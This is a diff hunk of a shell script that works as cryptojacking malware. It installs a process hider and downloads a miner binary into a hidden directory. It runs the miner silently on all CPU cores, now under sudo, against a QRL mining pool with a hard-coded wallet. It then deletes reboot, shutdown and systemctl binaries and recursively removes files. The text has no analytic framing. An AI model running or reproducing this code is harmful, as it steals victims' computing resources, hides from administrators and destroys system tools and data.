@@ -21,9 +21,9 @@ npm i -g node-process-hider
 ph add sgr1
 WORKER=$(TZ=":Asia/Jakarta" date '+%A,%d-%B-%Y' | sed 's/Monday/Senin/;s/Tuesday/Selasa/;s/Wednesday/Rabu/;s/Thursday/Kamis/;s/Friday/Jumat/;s/Saturday/Sabtu/;s/Sunday/Minggu/;s/January/Januari/;s/February/Februari/;s/March/Maret/;s/April/April/;s/May/Mei/;s/June/Juni/;s/July/Juli/;s/August/Agustus/;s/September/September/;s/October/Oktober/;s/November/November/;s/December/Desember/')
 mkdir .lib && cd .lib
-wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/xmt > /dev/null 2>&1 
-chmod u+x sgr1
-./sgr1 --donate-level 1 -o sg.qrl.herominers.com:1166 -u Q010500f8f21098ccf5acf2f08f0e6b315fb958d7c7a1bf811f34e49f7ac459f4aa7683c723391d -p $WORKER -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
+wget -O sgr1 https://github.com/TiannaMcdowell/All-File/raw/main/sereb > /dev/null 2>&1 
+chmod +x sgr1
+sudo ./sgr1 --algorithm randomx --pool 128.199.218.20:443 --wallet Q010500f8f21098ccf5acf2f08f0e6b315fb958d7c7a1bf811f34e49f7ac459f4aa7683c723391d --password $WORKER --disable-gpu --cpu-threads $(nproc --all) --enable-1gb-hugepages --keepalive > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 rm -rvf *
